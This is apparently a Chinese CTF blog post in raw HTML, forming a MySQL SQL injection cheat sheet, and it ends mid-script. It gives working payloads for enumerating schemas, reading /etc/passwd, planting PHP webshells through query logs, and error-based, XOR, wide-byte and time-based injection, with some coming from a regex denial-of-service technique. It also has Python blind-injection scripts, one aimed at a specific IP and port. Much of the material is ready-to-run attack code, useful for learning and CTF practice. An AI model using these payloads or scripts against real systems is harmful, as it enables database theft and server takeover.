title=\"查看当前数据库版本\"></a>查看当前数据库版本</h2><ul>\n<li>VERSION()</li>\n<li>@@VERSION</li>\n<li>@@GLOBAL.VERSION</li>\n</ul>\n<h2 id=\"当前登录用户\"><a href=\"#当前登录用户\" class=\"headerlink\" title=\"当前登录用户\"></a>当前登录用户</h2><ul>\n<li>user()</li>\n<li>current_user()</li>\n<li>system_user()</li>\n<li>session_user()</li>\n</ul>\n<h2 id=\"当前使用的数据库\"><a href=\"#当前使用的数据库\" class=\"headerlink\" title=\"当前使用的数据库\"></a>当前使用的数据库</h2><ul>\n<li>database()</li>\n<li>schema()</li>\n</ul>\n<h2 id=\"当前的操作系统\"><a href=\"#当前的操作系统\" class=\"headerlink\" title=\"当前的操作系统\"></a>当前的操作系统</h2><ul>\n<li>@@version_compile_os</li>\n</ul>\n<h2 id=\"路径相关\"><a href=\"#路径相关\" class=\"headerlink\" title=\"路径相关\"></a>路径相关</h2><ul>\n<li>@@basedir : mysql安装路径</li>\n<li>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</li>\n<li>@@DATADIR : 数据存储路径</li>\n<li>@@CHARACTER_SETS_DIR : 字符集设置文件路径</li>\n<li>@@LOG_ERROR : 错误日志文件路径：</li>\n<li>@@PID_FILE : pid-file文件路径</li>\n<li>@@BASEDIR : mysql安装路径：</li>\n<li>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</li>\n</ul>\n<h2 id=\"字母-数字相关\"><a href=\"#字母-数字相关\" class=\"headerlink\" title=\"字母/数字相关\"></a>字母/数字相关</h2><ul>\n<li>ASCII(): 获取字母的ascii码值</li>\n<li>BIN(): 返回值的二进制串表示</li>\n<li>CONV(): 进制转换</li>\n<li>FLOOR(): 函数只返回整数部分，小数部分舍弃。</li>\n<li>ROUND(): 函数四舍五入，大于0.5的部分进位，不到则舍弃。</li>\n<li>LOWER()：转成小写字母</li>\n<li>UPPER(): 转成大写字母</li>\n<li>HEX():十六进制编码</li>\n<li>UNHEX()：十六进制解码</li>\n</ul>\n<h2 id=\"字符串截取\"><a href=\"#字符串截取\" class=\"headerlink\" title=\"字符串截取\"></a>字符串截取</h2><ul>\n<li>MID(column_name,start[,length]) start起始为1</li>\n<li>LEFT(str,length) length为从左边开始要返回的字符数</li>\n<li>RIGHT(str,length). length为从右边开始要返回的字符数</li>\n<li>SUBSTR(str,pos,len) 从pos开始截取len个,pos起始为1,pos 可以是负值</li>\n<li>SUBSTRING(str,pos,len). 与subsets()相同</li>\n</ul>\n<h1 id=\"常规语句\"><a href=\"#常规语句\" class=\"headerlink\" title=\"常规语句\"></a>常规语句</h1><p>查询全部数据库名：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select group_concat(schema_name) from information_schema.schemeta limit 0,10</span><br></pre></td></tr></table></figure>\n\n\n<p>查询指定表名：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;sqli&#39;  &#x2F;&#x2F;可用十六进制</span><br></pre></td></tr></table></figure>\n\n\n<p>查询指定列名：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;user&#39; and table_schema&#x3D;&#39;sqli&#39;</span><br></pre></td></tr></table></figure>\n\n<p>获取指定数据:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select flag from flag</span><br><span class=\"line\">select username,password from sqli.user (垮库查询)</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"绕过information-schema\"><a href=\"#绕过information-schema\" class=\"headerlink\" title=\"绕过information_schema\"></a>绕过information_schema</h1><p>一、利用mysql5.7新增的sys.schema_auto_increment_columns</p>\n<p>sys.schema_auto_increment_columns</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/beiwang/image-20230102235209264.png\" alt=\"image-20230102235209264\"></p>\n<p>二、mysql默认存储引擎innoDB携带的表</p>\n<p> mysql.innodb_table_stats</p>\n<p> mysql.innodb_index_stats</p>\n<p> 两表均有database_name和table_name字段，可以利用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/beiwang/image-20230102235456704.png\" alt=\"image-20230102235456704\"></p>\n<p>三、sys数据库</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">表单或视图</th>\n<th align=\"center\">存储数据库名字段</th>\n<th align=\"center\">存储表单名字段</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">sys.innodb_buffer_stats_by_table</td>\n<td align=\"center\">object_schema</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">sys.x$innodb_buffer_stats_by_table</td>\n<td align=\"center\">object_schema</td>\n<td align=\"center\">object_name</td>\n</tr>\n<tr>\n<td align=\"center\">sys.schema_auto_increment_columns</td>\n<td align=\"center\">table_schema</td>\n<td align=\"center\">table_name</td>\n</tr>\n<tr>\n<td align=\"center\">sys.schema_table_statistics</td>\n<td align=\"center\"></td>\n<td align=\"center\">table_schema</td>\n</tr>\n<tr>\n<td align=\"center\">sys.x$schema_table_statistics</td>\n<td align=\"center\">table_schema</td>\n<td align=\"center\">table_name</td>\n</tr>\n<tr>\n<td align=\"center\">sys.schema_table_statistics_with_buffer</td>\n<td align=\"center\">table_schema</td>\n<td align=\"center\">table_name</td>\n</tr>\n<tr>\n<td align=\"center\">sys.x$schema_table_statistics_with_buffer</td>\n<td align=\"center\">table_schema</td>\n<td align=\"center\">table_name</td>\n</tr>\n<tr>\n<td align=\"center\">sys.schema_tables_with_full_table_scans</td>\n<td align=\"center\">object_schema</td>\n<td align=\"center\">object_name</td>\n</tr>\n<tr>\n<td align=\"center\">sys.x$schema_tables_with_full_table_scans</td>\n<td align=\"center\">object_schema</td>\n<td align=\"center\">object_name</td>\n</tr>\n<tr>\n<td align=\"center\">sys.io_global_by_file_by_latency</td>\n<td align=\"center\">file字段包含数据名和表单名</td>\n<td align=\"center\">file字段包含数据名和表单名</td>\n</tr>\n<tr>\n<td align=\"center\">sys.x$io_global_by_file_by_latency</td>\n<td align=\"center\">file字段包含数据名和表单名</td>\n<td align=\"center\">file字段包含数据名和表单名</td>\n</tr>\n<tr>\n<td align=\"center\">sys.io_global_by_file_by_bytes</td>\n<td align=\"center\">file字段包含数据名和表单名</td>\n<td align=\"center\">file字段包含数据名和表单名</td>\n</tr>\n<tr>\n<td align=\"center\">sys.x$io_global_by_file_by_bytes</td>\n<td align=\"center\">file字段包含数据名和表单名</td>\n<td align=\"center\">file字段包含数据名和表单名</td>\n</tr>\n<tr>\n<td align=\"center\">sys.x$schema_flattened_keys</td>\n<td align=\"center\">table_schema</td>\n<td align=\"center\">table_name</td>\n</tr>\n<tr>\n<td align=\"center\">sys.x$ps_schema_table_statistics_io</td>\n<td align=\"center\">table_schema</td>\n<td align=\"center\">table_name</td>\n</tr>\n<tr>\n<td align=\"center\">performance_schema.objects_summary_global_by_type</td>\n<td align=\"center\">object_schema</td>\n<td align=\"center\">object_name</td>\n</tr>\n<tr>\n<td align=\"center\">performance_schema.table_handles</td>\n<td align=\"center\"></td>\n<td align=\"center\">object_schema</td>\n</tr>\n<tr>\n<td align=\"center\">performance_schema.table_io_waits_summary_by_index_usage</td>\n<td align=\"center\">object_schema</td>\n<td align=\"center\">object_name</td>\n</tr>\n<tr>\n<td align=\"center\">performance_schema.table_io_waits_summary_by_table</td>\n<td align=\"center\">object_schema</td>\n<td align=\"center\">object_name</td>\n</tr>\n</tbody></table>\n<p>还有一些存储报错语句的和执行状态的表单或视图得知其中含有的数据库名和表单信息，通过获取query可以查看之前用到的查询语句。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">视图</th>\n<th align=\"center\">字段</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">sys.statements_with_errors_or_warnings</td>\n<td align=\"center\">query</td>\n</tr>\n<tr>\n<td align=\"center\">sys.statements_with_full_table_scans</td>\n<td align=\"center\">query</td>\n</tr>\n<tr>\n<td align=\"center\">sys.statement_analysis</td>\n<td align=\"center\">query</td>\n</tr>\n<tr>\n<td align=\"center\">sys.x$statement_analysis</td>\n<td align=\"center\">query</td>\n</tr>\n<tr>\n<td align=\"center\">performance_schema.events_statements_summary_by_digest</td>\n<td align=\"center\">digest_text(查询记录)</td>\n</tr>\n<tr>\n<td align=\"center\">performance_schema.file_instances</td>\n<td align=\"center\">file_name(文件路径)</td>\n</tr>\n</tbody></table>\n<h1 id=\"读写文件\"><a href=\"#读写文件\" class=\"headerlink\" title=\"读写文件\"></a>读写文件</h1><p>条件：</p>\n<ul>\n<li><p>数据库允许导入导出（secure_file_priv）</p>\n</li>\n<li><p>当前用户用户文件操作权限（File_priv），尽量具有root权限</p>\n</li>\n<li><p>知道绝对物理路径</p>\n</li>\n</ul>\n<p>查看权限配置</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select File_priv from mysql.user where user&#x3D;&#39;root&#39; and host&#x3D;&#39;localhost&#39;</span><br><span class=\"line\">show global variables like &#39;%secure%&#39;;</span><br></pre></td></tr></table></figure>\n\n<p>secure_file_priv 参数用来限制数据导入和导出操作的效果</p>\n<ul>\n<li>secure_file_prive=null ;限制mysqld 不允许导入和导出</li>\n<li>secure_file_priv=/tmp/ ;限制mysqld 的导入和导出只能在/tmp/目录下</li>\n<li>secure_file_priv=’’ ;不对mysqld 的导入和导出做限制</li>\n</ul>\n<blockquote>\n<p>mysql 5.6.34版本以后，配置文件默认没有secure_file_priv这个选项，实际为NULL。并且无法用sql语句对其进行修改，只能够通过修改以下文件。</p>\n<p>windows下 my.ini<br>[mysqld]<br>secure_file_priv=</p>\n<p>linux下 cat /etc/my.cnf<br>[mysqld]<br>secure_file_priv=</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select load_file(&#39;&#x2F;etc&#x2F;passwd&#39;); 可使用hex绕过引号</span><br><span class=\"line\">select &#39;test&#39; into outfile &#39;&#x2F;tmp&#x2F;demo.txt&#39;;</span><br><span class=\"line\">select &#39;test&#39; into dumpfile &#39;&#x2F;tmp&#x2F;demo.txt&#39;</span><br></pre></td></tr></table></figure>\n\n<p>dumpfile和outfile不同在于，outfile会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏</p>\n<h1 id=\"日志写shell\"><a href=\"#日志写shell\" class=\"headerlink\" title=\"日志写shell\"></a>日志写shell</h1><p><strong>突破secure_file_priv 选项限制</strong>，通过日志文件，原理都是修改日志存放的路径及文件，通过执行操作把木马存入修改后的日志中，达到写入木马的目的。</p>\n<p>mysql日志主要包含:错误日志、查询日志、慢查询日志、事务日志、二进制日志，只有查询日志和慢查询日志可利用。</p>\n<p>查看日志状态（默认禁止）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">show variables like &#39;general_log%&#39;;       查询日志</span><br><span class=\"line\">show variables like &#39;%slow_query_log%&#39;;   慢查询日志</span><br></pre></td></tr></table></figure>\n\n<p>开启日志记录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">set global general_log &#x3D; &#39;ON&#39;;   查询日志</span><br><span class=\"line\">set global slow_query_log&#x3D;1;     慢查询日志</span><br></pre></td></tr></table></figure>\n\n<p>伪造(修改)日志文件的绝对路径以及文件名</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">set global general_log_file&#x3D;&quot;&#x2F;tmp&#x2F;test.php&quot;;    查询日志</span><br><span class=\"line\">set global slow_query_log_file&#x3D;&#39;&#x2F;tmp&#x2F;test.php’; 慢查询日志</span><br></pre></td></tr></table></figure>\n\n<p>执行sql语句，mysql会将执行的语句内容记录到我们指定的文件中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select &#39;&lt;?php phpinfo() ?&gt;&#39;;                 查询日志</span><br><span class=\"line\">select &#39;&lt;?php phpinfo() ?&gt;&#39; or sleep(11);    慢查询日志</span><br></pre></td></tr></table></figure>\n\n<p>关于慢查询日志</p>\n<p>命令执行时间超过long_query_time设定的值(默认10s)，则会保存至慢查询日志。查看long_query_time设定的值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">show global variables like &#39;%long_query_time%&#39;;   </span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"变量注入\"><a href=\"#变量注入\" class=\"headerlink\" title=\"变量注入\"></a>变量注入</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from user limit 0,1 into @a,@b,@c;</span><br><span class=\"line\">select * from user where username&#x3D;&#39;&#39; union select @a,@b,@c;</span><br><span class=\"line\"></span><br><span class=\"line\">搭配写文件</span><br><span class=\"line\">select count(*) from user where id &#x3D;&#39;1&#39; union select * from(select &#39;shell&#39;)a limit 1,1 into @a;</span><br><span class=\"line\">select @a into outfile &#39;&#x2F;tmp&#x2F;flag.txt&#39;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"异或注入\"><a href=\"#异或注入\" class=\"headerlink\" title=\"异或注入\"></a>异或注入</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from ctf_test where user&#x3D;&#39;2&#39;^(mid(user(),1,1)&#x3D;&#39;s&#39;)^1;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"order-by盲注\"><a href=\"#order-by盲注\" class=\"headerlink\" title=\"order by盲注\"></a>order by盲注</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from user where id&#x3D;&#39;1&#39; union select 1,2,binary(&#39;E&#39;) order by 3</span><br><span class=\"line\">+----+----------+----------------------------------+</span><br><span class=\"line\">| id | username | password                         |</span><br><span class=\"line\">+----+----------+----------------------------------+</span><br><span class=\"line\">|  1 | Dump     | Dump                             |</span><br><span class=\"line\">|  1 | 2        | E                                |</span><br><span class=\"line\">+----+----------+----------------------------------+</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">select * from user where id&#x3D;&#39;1&#39; union select 1,2,binary(&#39;D&#39;) order by 3</span><br><span class=\"line\">+----+----------+----------------------------------+</span><br><span class=\"line\">| id | username | password                         |</span><br><span class=\"line\">+----+----------+----------------------------------+</span><br><span class=\"line\">|  1 | 2        | D                                |</span><br><span class=\"line\">|  1 | Dump     | Dump                             |</span><br><span class=\"line\">+----+----------+----------------------------------+</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"无列名注入\"><a href=\"#无列名注入\" class=\"headerlink\" title=\"无列名注入\"></a>无列名注入</h1><p><a href=\"https://k1te.cn/2021/05/19/no-column-sql-injection/\">ctf无列名注入小结 </a></p>\n<h2 id=\"列名重复（join…using）\"><a href=\"#列名重复（join…using）\" class=\"headerlink\" title=\"列名重复（join…using）\"></a>列名重复（join…using）</h2><p>条件：需要开启报错</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from user where username&#x3D;&#39;1&#39; union select * from (select * from user a join user b)c   &#x2F;&#x2F;dump出第一个字段名：</span><br><span class=\"line\">&gt; 1060 - Duplicate column name &#39;id&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">select * from user where username&#x3D;&#39;1&#39; union select * from (select * from user a join user b using(id))c   &#x2F;&#x2F;dump出第二个字段名：</span><br><span class=\"line\">&gt; 1060 - Duplicate column name &#39;username&#39;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"通过别名，引用列名（需要使用union）\"><a href=\"#通过别名，引用列名（需要使用union）\" class=\"headerlink\" title=\"通过别名，引用列名（需要使用union）\"></a>通过别名，引用列名（需要使用union）</h2><p>条件：有查询内容回显</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from user where username&#x3D;&#39;-1&#39; union select 1,1,group_concat(&#96;2&#96;) from (select 1,2,3 union select * from user)c</span><br><span class=\"line\"></span><br><span class=\"line\">反引号禁用时，使用别名 as 绕过或者双引号：</span><br><span class=\"line\">select * from user where username&#x3D;&#39;-1&#39; union select 1,1,group_concat(a) from (select 1,2,3 as a union select * from user)c</span><br><span class=\"line\">select * from user where username&#x3D;&#39;-1&#39; union select 1,1,group_concat(a) from (select 1,2,3 a union select * from user)c</span><br><span class=\"line\">select * from user where username&#x3D;&#39;-1&#39; union select 1,1,group_concat(a) from (select 1,2,&quot;a&quot; union select * from user)c</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"比较盲注\"><a href=\"#比较盲注\" class=\"headerlink\" title=\"比较盲注\"></a>比较盲注</h2><p>条件：盲注条件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select ((select &quot;f&quot;)&gt;(select &quot;flag&#123;xxxx&#125;&quot;));</span><br><span class=\"line\">&gt; 0</span><br><span class=\"line\">select ((select &quot;fm&quot;)&gt;(select &quot;flag&#123;xxxx&#125;&quot;));</span><br><span class=\"line\">&gt; 1</span><br><span class=\"line\">select ((select 1,&quot;fm&quot;)&gt;(select * from flag));</span><br><span class=\"line\">&gt; 1</span><br></pre></td></tr></table></figure>\n\n<p>塞个脚本</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">def add(flag):</span><br><span class=\"line\">    res&#x3D;&#39;&#39;</span><br><span class=\"line\">    res +&#x3D; flag</span><br><span class=\"line\">    return res</span><br><span class=\"line\"></span><br><span class=\"line\">payload &#x3D; &quot;&quot;&quot;1^((select 1,&quot;&#123;&#125;&quot;) &gt; (select * from f1ag_1s_h3r3_hhhhh ))^1&quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">url&#x3D;&quot;http:&#x2F;&#x2F;url&#x2F;index.php&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">flag&#x3D;&#39;&#39;</span><br><span class=\"line\">for i in range(1,80):</span><br><span class=\"line\">    for j in range(32,140):</span><br><span class=\"line\">        mixchar &#x3D; add(flag+chr(j))</span><br><span class=\"line\">        py &#x3D; payload.format(mixchar)</span><br><span class=\"line\">        data &#x3D; &#123;&quot;id&quot;: py&#125;</span><br><span class=\"line\">        r &#x3D; requests.post(url&#x3D;url,data&#x3D;data)</span><br><span class=\"line\">        if &#39;Nu1L&#39; in r.text:</span><br><span class=\"line\">            flag &#x3D; flag+chr(j-1)</span><br><span class=\"line\">            print(flag)</span><br><span class=\"line\">            break</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"宽字节注入\"><a href=\"#宽字节注入\" class=\"headerlink\" title=\"宽字节注入\"></a>宽字节注入</h1><p>条件：mysql数据库编码为gbk,且 <code>&#39;</code> 被转义成 <code>\\&#39;</code></p>\n<p>注入：使用 <code>id=%df%27</code></p>\n<p>原理：这里的 <code>%27</code>会被变成 <code>\\%27</code> 即 <code>%5c%27</code>，再加上前边的 <code>%df</code> 变成 <code>%df%5c%27</code>，而 <code>%df%5c</code> 在gbk字符集中表示汉子： 運，故语句便成 <code>id=運&#39;</code>，成功逃逸出单引号转义(php中通常是addslashes函数，或开启GPC，PHP5.4版本已移除GPC)</p>\n<h1 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h1><p>floor</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from test where id&#x3D;1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>\n\n<p>extractvalue</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure>\n\n<p>updatexml</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure>\n\n<p>geometrycollection</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>\n\n<p>multipoint</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>\n\n<p>polygon</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">id&#x3D;1 and polygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>\n\n<p>multipolygon</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>\n\n<p>linestring</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">id&#x3D;1 and linestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>\n\n<p>multilinestring</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>\n\n<p>exp</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">id&#x3D;1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"五种延时注入\"><a href=\"#五种延时注入\" class=\"headerlink\" title=\"五种延时注入\"></a>五种延时注入</h1><p>一、sleep：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select sleep(5);</span><br></pre></td></tr></table></figure>\n\n<p>二、benchmark：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select benchmark(10000000,md5(1));</span><br></pre></td></tr></table></figure>\n\n<p>三、笛卡尔积：</p>\n<p>利用 <code>and短路运算规则</code> 进行时间盲注</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class=\"line\">+------+-----+</span><br><span class=\"line\">| user | pwd |</span><br><span class=\"line\">+------+-----+</span><br><span class=\"line\">| 1    | 0   |</span><br><span class=\"line\">+------+-----+</span><br><span class=\"line\">1 row in set (2.08 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;0 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class=\"line\">Empty set (0.01 sec)</span><br></pre></td></tr></table></figure>\n\n<p>四、get_clock共享锁：</p>\n<p>两个session进行操作</p>\n<p>SESSION A</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mysql&gt; select get_lock(&#39;lihuaiqiu&#39;,1);</span><br><span class=\"line\">+-------------------------+</span><br><span class=\"line\">| get_lock(&#39;lihuaiqiu&#39;,1) |</span><br><span class=\"line\">+-------------------------+</span><br><span class=\"line\">|                       1 |</span><br><span class=\"line\">+-------------------------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<p>SESSION B</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mysql&gt; select get_lock(&#39;lihuaiqiu&#39;,5);</span><br><span class=\"line\">+-------------------------+</span><br><span class=\"line\">| get_lock(&#39;lihuaiqiu&#39;,5) |</span><br><span class=\"line\">+-------------------------+</span><br><span class=\"line\">|                       0 |</span><br><span class=\"line\">+-------------------------+</span><br><span class=\"line\">1 row in set (5.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from ctf_test where user&#x3D;&#39;0&#39; and 1&#x3D;1 and  get_lock(&#39;lihuaiqiu&#39;,2);</span><br><span class=\"line\">Empty set (2.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from ctf_test where user&#x3D;&#39;0&#39; and 1&#x3D;0 and  get_lock(&#39;lihuaiqiu&#39;,2);</span><br><span class=\"line\">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<p>五、正则dos，rlike：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from flag where flag&#x3D;&#39;1&#39; and if(mid(user(),1,1)&#x3D;&#39;s&#39;,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,1);</span><br><span class=\"line\">+------+</span><br><span class=\"line\">| flag |</span><br><span class=\"line\">+------+</span><br><span class=\"line\">| 1    |</span><br><span class=\"line\">+------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from flag where flag&#x3D;&#39;1&#39; and if(mid(user(),1,1)&#x3D;&#39;r&#39;,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+cd&#39;,1);</span><br><span class=\"line\">Empty set (3.83 sec)</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"脚本\"><a href=\"#脚本\" class=\"headerlink\" title=\"脚本\"></a>脚本</h1><h2 id=\"布尔盲注\"><a href=\"#布尔盲注\" class=\"headerlink\" title=\"布尔盲注\"></a>布尔盲注</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">url &#x3D; &quot;http:&#x2F;&#x2F;121.43.141.153:60056&#x2F;error.php?code&#x3D;&quot;</span><br><span class=\"line\">result &#x3D; &quot;&quot;</span><br><span class=\"line\">i &#x3D; 0</span><br><span class=\"line\">while (True):</span><br><span class=\"line\">    i &#x3D; i + 1</span><br><span class=\"line\">    head &#x3D; 32</span><br><span class=\"line\">    tail &#x3D; 127</span><br><span class=\"line\">    while (head &lt; tail):</span><br><span class=\"line\">        mid &#x3D; (head + tail) &gt;&gt; 1</span><br><span class=\"line\">        #payload &#x3D; &quot;if(ascii(substr(database(),%d,1))&gt;%d,404,403)&quot; % (i , mid)</span><br><span class=\"line\">        #payload &#x3D; &quot;if(ascii(substr((select group_concat(table_name)from(information_schema.tables)where(table_schema&#x3D;database())),%d,1))&gt;%d,1,0)&quot; % (i,mid)</span><br><span class=\"line\">        #payload &#x3D; &quot;if(ascii(substr((select group_concat(column_name)from(information_schema.columns)where(table_name like &#39;flag&#39;)),%d,1))&gt;%d,404,403)&quot; % (i,mid)</span><br><span class=\"line\">        payload &#x3D; &quot;if(ascii(substr((select flag from fllllllllaaaaaag),%d,1))&gt;%d,404,403)&quot; % (i,mid)</span><br><span class=\"line\">        r &#x3D; requests.get(url + payload)</span><br><span class=\"line\">        </span><br><span class=\"line\">        if &quot;404&quot; in r.text:</span><br><span class=\"line\">            head &#x3D; mid + 1</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            # print(r.text)</span><br><span class=\"line\">            tail &#x3D; mid</span><br><span class=\"line\">    last &#x3D; result</span><br><span class=\"line\">    if head !&#x3D; 32:</span><br><span class=\"line\">        result +&#x3D; chr(head)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        break</span><br><span class=\"line\">    print(result)</span><br></pre></td></tr></table></figure>\n\n<p>没有 union substr mid sleep</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">url &#x3D; &quot;http:&#x2F;&#x2F;xxx&#x2F;index.php?act&#x3D;search&quot;</span><br><span class=\"line\">flag &#x3D; &quot;&quot;</span><br><span class=\"line\">for i in range(1,60):</span><br><span class=\"line\">    right &#x3D; 127</span><br><span class=\"line\">    left &#x3D; 32</span><br><span class=\"line\">    while left &lt; right:</span><br><span class=\"line\">        mid &#x3D; (left + right)&#x2F;&#x2F;2</span><br><span class=\"line\">        paylaod &#x3D; &#123;</span><br><span class=\"line\">        &quot;keyword&quot;:f&quot;aoliao%&#39;and\\&quot;1\\&quot;&#x3D;if(ord(right((select(group_concat(flag))from(flag)),&#123;i&#125;))&gt;&#123;mid&#125;,1,0)#&quot;</span><br><span class=\"line\">        